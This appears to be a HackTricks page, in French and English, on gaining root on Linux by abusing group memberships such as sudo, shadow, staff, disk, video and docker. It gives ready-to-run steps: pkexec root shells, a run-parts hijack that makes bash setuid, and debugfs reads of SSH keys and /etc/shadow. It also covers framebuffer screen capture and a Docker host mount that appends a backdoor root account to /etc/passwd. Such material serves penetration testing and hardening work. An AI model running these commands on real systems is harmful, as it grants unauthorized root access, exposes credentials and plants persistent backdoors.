# Groupes intéressants - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Groupes Sudo/Admin

### **PE - Method 1**

**Parfois**, **par défaut (ou parce que certains logiciels en ont besoin)** dans le fichier **/etc/sudoers** vous pouvez trouver certaines de ces lignes :
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe sudo ou admin peut exécuter n'importe quoi en tant que sudo**.

Si tel est le cas, pour **devenir root vous pouvez simplement exécuter** :
```
sudo su
```
### PE - Method 2

Trouver tous les binaires suid et vérifier si le binaire **Pkexec** est présent :
```bash
find / -perm -4000 2>/dev/null
```
Si vous trouvez que le binaire **pkexec is a SUID binary** et que vous appartenez à **sudo** ou **admin**, vous pourrez probablement exécuter des binaires en tant que sudo en utilisant `pkexec`.\
Ceci s'explique car typiquement ce sont les groupes définis dans la **polkit policy**. Cette policy identifie essentiellement quels groupes peuvent utiliser `pkexec`. Vérifiez-le avec :
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Là vous trouverez quels groupes sont autorisés à exécuter **pkexec** et **par défaut** dans certaines distributions linux les groupes **sudo** et **admin** apparaissent.

Pour **devenir root, vous pouvez exécuter**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si vous essayez d'exécuter **pkexec** et que vous obtenez cette **erreur** :
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Ce n'est pas parce que vous n'avez pas les permissions mais parce que vous n'êtes pas connecté avec une GUI**. Et il existe une solution de contournement pour ce problème ici : [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Groupe Wheel

**Parfois**, **par défaut** dans le fichier **/etc/sudoers** vous pouvez trouver cette ligne :
```
%wheel	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe wheel peut exécuter n'importe quoi avec sudo**.

Si c'est le cas, pour **devenir root vous pouvez simplement exécuter** :
```
sudo su
```
## Groupe shadow

Les utilisateurs du **groupe shadow** peuvent **lire** le fichier **/etc/shadow** :
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Donc, lisez le fichier et essayez de **crack some hashes**.

Quick lock-state nuance when triaging hashes:
- Entries with `!` or `*` are generally non-interactive for password logins.
- `!hash` usually means a password was set and then locked.
- `*` usually means no valid password hash was ever set.
This is useful for account classification even when direct login is blocked.

## Groupe staff

**staff**: Permet aux utilisateurs d'ajouter des modifications locales au système (`/usr/local`) sans nécessiter les privilèges root (notez que les exécutables dans `/usr/local/bin` se trouvent dans la variable `$PATH` de tout utilisateur, et ils peuvent "remplacer" les exécutables dans `/bin` et `/usr/bin` ayant le même nom). Comparez avec le groupe "adm", qui est plutôt lié à la surveillance/la sécurité. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Si nous pouvons hijack certains programmes dans `/usr/local`, nous pouvons facilement obtenir root.

Hijack du programme `run-parts` est un moyen facile d'obtenir root, car la plupart des programmes exécuteront `run-parts` (crontab, lors d'une connexion ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ou lorsqu'une nouvelle session ssh se connecte.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Groupe disk

Ce privilège est presque **équivalent à un accès root** car vous pouvez accéder à toutes les données présentes sur la machine.

Fichiers:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Notez que, en utilisant debugfs, vous pouvez aussi **écrire des fichiers**. Par exemple, pour copier `/tmp/asd1.txt` vers `/tmp/asd2.txt`, vous pouvez faire :
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Cependant, si vous essayez d'**écrire des fichiers appartenant à root** (comme `/etc/shadow` ou `/etc/passwd`) vous obtiendrez une erreur "**Permission denied**".

## Groupe video

En utilisant la commande `w`, vous pouvez trouver **qui est connecté au système** et elle affichera une sortie comme la suivante :
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Le **tty1** signifie que l'utilisateur **yossi est connecté physiquement** à un terminal sur la machine.

Le **video group** a accès pour visualiser la sortie écran. En pratique, vous pouvez observer les écrans. Pour cela, vous devez **capturer l'image courante de l'écran** en données brutes et obtenir la résolution utilisée par l'écran. Les données d'écran peuvent être enregistrées dans `/dev/fb0` et vous pouvez trouver la résolution de cet écran dans `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Pour **ouvrir** l'**image raw** vous pouvez utiliser **GIMP**, sélectionner le fichier **`screen.raw`** et choisir comme type de fichier **Raw image data**:

![](<../../../images/image (463).png>)

Puis modifiez les champs Width et Height pour correspondre à ceux de l'écran et testez différents Image Types (et sélectionnez celui qui affiche le mieux l'écran) :

![](<../../../images/image (317).png>)

## Root Group

Il semble que, par défaut, **members of root group** pourraient avoir accès pour **modify** certains fichiers de configuration de **service**, certains fichiers de **libraries** ou **other interesting things** qui pourraient être utilisés pour escalate privileges...

**Vérifiez quels fichiers les root members peuvent modify**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Vous pouvez **monter le système de fichiers root de la machine hôte sur le volume d'une instance**, de sorte que, lorsque l'instance démarre, elle charge immédiatement un `chroot` dans ce volume. Cela vous donne effectivement root sur la machine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Groupe lxc/lxd


{{#ref}}
./
{{#endref}}

## Groupe adm

Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.

## Groupes Backup / Operator / lp / Mail

Ces groupes sont souvent des vecteurs de **credential-discovery** plutôt que des vecteurs d'accès direct à root :
- **backup**: peut exposer des archives contenant des configs, des clés, des dumps de DB, ou des tokens.
- **operator**: un accès opérationnel spécifique à la plateforme qui peut leak des données sensibles d'exécution.
- **lp**: les files d'impression/spools peuvent contenir le contenu des documents.
- **mail**: les spools de mail peuvent exposer des liens de réinitialisation, des OTPs, et des identifiants internes.

Considérez l'appartenance à ces groupes comme une découverte d'exposition de données à haute valeur et pivotez via la réutilisation de mots de passe/tokens.

## Groupe auth

Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
Ces permissions peuvent être abusées avec l'exploit suivant pour **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
